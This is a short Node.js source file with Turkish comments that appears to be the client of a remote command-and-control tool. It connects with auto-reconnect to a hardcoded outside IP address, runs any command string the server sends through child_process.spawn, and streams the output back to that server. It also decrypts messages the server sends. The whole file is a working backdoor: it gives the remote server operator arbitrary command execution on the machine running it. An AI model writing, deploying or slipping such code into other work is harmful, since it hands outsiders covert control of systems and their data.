var io = require('socket.io-client');


var crypto = require('./crypto');

//reconnect parametresi bağlantı koptuğunda tekrardan sunucuya bağlanması için
var socket = io.connect('http://25.17.19.10:2620', {reconnect: true});



socket.on('connect', function(socket){
    console.log('connected!');

});

socket.on('run cmd', function(data){
    console.log(data);
    var child = new run_cmd(data);
    child.stdout.setEncoding('utf-8');
    child.stdout.on('data', function(data){
        console.log('veri gönderiliyor..');
        socket.emit('terminal', {output: data});
    });

});


function run_cmd(cmd){
    //spawn, sistem komutlarını çalıştırmamızı sağlayan bir komuttur.
    //child_process modülü bize isletim sistemi fonksiyonlarına erişmemizi sağlar.
    //spawn çağrısıyla dönen child proses return edilir.
    var spawn = require('child_process').spawn;
    var child_p = spawn(cmd);
    return child_p;
}

//Burada şifreli veri parse edilecek.
socket.on('data', function(data){
    var veri = crypto.decrypt(data);

    console.log(veri);



});


socket.on('disconnect', function(){
    console.log('disconnected!');
});
